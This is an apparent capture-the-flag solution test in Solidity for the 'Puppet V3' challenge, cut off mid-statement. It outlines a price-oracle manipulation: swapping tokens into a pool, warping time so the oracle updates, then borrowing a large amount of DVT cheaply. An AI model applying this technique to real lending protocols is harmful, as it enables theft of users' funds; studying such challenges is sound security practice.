...
import {PuppetAttacker} from "./PuppetAttacker.sol";
...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        // swap over pool amount of token to weth letting the pool have very low amount of weth remained in pool
        attacker.attack(PLAYER_INITIAL_TOKEN_BALANCE);

        // have to wait for oracle to update
        vm.warp(block.timestamp + 70);

        // oracle has updated, now attacker needs less then 2e18 weth for borrowing 1_000_000e18 amount of DVT
        console.log(
